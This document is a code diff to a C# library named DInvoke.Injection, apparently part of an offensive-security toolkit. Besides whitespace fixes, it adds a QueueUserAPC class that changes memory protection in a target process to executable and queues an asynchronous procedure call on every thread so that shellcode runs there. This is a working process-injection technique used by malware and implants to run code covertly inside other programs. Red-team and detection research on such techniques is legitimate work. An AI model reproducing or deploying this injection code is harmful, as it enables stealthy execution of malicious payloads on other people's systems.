@@ -40,7 +40,7 @@ namespace DInvoke.Injection
         /// <returns>bool</returns>
         public bool Inject(PayloadType Payload, AllocationTechnique AllocationTechnique, Process Process)
         {
-            Type[] funcPrototype = new Type[] { Payload.GetType(), AllocationTechnique.GetType(), Process.GetType()};
+            Type[] funcPrototype = new Type[] { Payload.GetType(), AllocationTechnique.GetType(), Process.GetType() };
 
             try
             {
@@ -93,7 +93,7 @@ namespace DInvoke.Injection
         /// <returns></returns>
         public virtual bool Inject(PayloadType Payload, AllocationTechnique AllocationTechnique)
         {
-            Type[] funcPrototype = new Type[] { Payload.GetType(), AllocationTechnique.GetType()};
+            Type[] funcPrototype = new Type[] { Payload.GetType(), AllocationTechnique.GetType() };
 
             try
             {
@@ -111,7 +111,7 @@ namespace DInvoke.Injection
         }
     }
 
-    
+
     /// <summary>
     /// Executes a payload in a remote process by creating a new thread. Allows the user to specify which API call to use for remote thread creation.
     /// </summary>
@@ -246,7 +246,86 @@ namespace DInvoke.Injection
                 return false;
             }
             handle = threadHandle;
-            return true;            
+            return true;
+        }
+    }
+
+    /// <summary>
+    /// Executes a payload in a remote process by Queuing UserAPC.
+    /// </summary>
+    /// 
+
+    public class QueueUserAPC : ExecutionTechnique
+    {
+        /// <summary>
+        /// States whether the payload is supported.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        /// <param name="Payload">Payload that will be allocated.</param>
+        /// <returns></returns>
+        public override bool IsSupportedPayloadType(PayloadType Payload)
+        {
+            return supportedPayloads.Contains(Payload.GetType());
+        }
+
+        /// <summary>
+        /// Internal method for setting the supported payload types. Used in constructors.
+        /// Update when new types of payloads are added.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        internal override void DefineSupportedPayloadTypes()
+        {
+            // Defines the set of supported payload types.
+            supportedPayloads = new Type[] {
+                typeof(PICPayload)
+            };
+        }
+
+        public bool Inject(PICPayload Payload, AllocationTechnique AllocationTechnique, Process Process)
+        {
+            IntPtr baseAddr = AllocationTechnique.Allocate(Payload, Process);
+            return Inject(Payload, baseAddr, Process);
+        }
+
+        /// <summary>
+        /// Opens a Thread and Queues UserAPC in a specified process.
+        /// </summary>
+        /// <author>The Wover (@TheRealWover)</author>
+        /// <param name="Payload">The shellcode payload to execute in the target process.</param>
+        /// <param name="BaseAddress">The address of the shellcode in the target process.</param>
+        /// <param name="Process">The target process to inject into.</param>
+        /// <returns></returns>
+        public bool Inject(PICPayload Payload, IntPtr BaseAddress, Process Process)
+        {
+            /*
+            IntPtr tpointer = DynamicInvoke.Win32.OpenThread(Data.Win32.Kernel32.ThreadAccess.SetContext, false, (int)pi.dwThreadId);
+            DynamicInvoke.Win32.VirtualProtectEx(pi.hProcess, alloc, sc.Length, 0x20, out oldProtect);
+            DynamicInvoke.Win32.QueueUserAPC(alloc, tpointer, IntPtr.Zero);
+            DynamicInvoke.Win32.ResumeThread(pi.hThread);
+            
+            IntPtr threadHandle = new IntPtr();
+            Data.Native.NTSTATUS result = Data.Native.NTSTATUS.Unsuccessful;
+            */
+            uint oldProtect = 0;
+            bool success = false;
+            try
+            {
+                IntPtr procHandle = Process.Handle;
+                success = DynamicInvoke.Win32.VirtualProtectEx(procHandle, BaseAddress, Payload.Payload.Length, Data.Win32.WinNT.PAGE_EXECUTE_READ, out oldProtect);
+                foreach (ProcessThread thread in Process.Threads)
+                {
+                    IntPtr hThread = DynamicInvoke.Win32.OpenThread(Data.Win32.Kernel32.ThreadAccess.All, false, (int)thread.Id);
+                    IntPtr ptr = DynamicInvoke.Win32.QueueUserAPC(BaseAddress, hThread, IntPtr.Zero);
+                }
+                success = true;
+                return success;
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+                return success;
+            }
+
         }
     }
 }
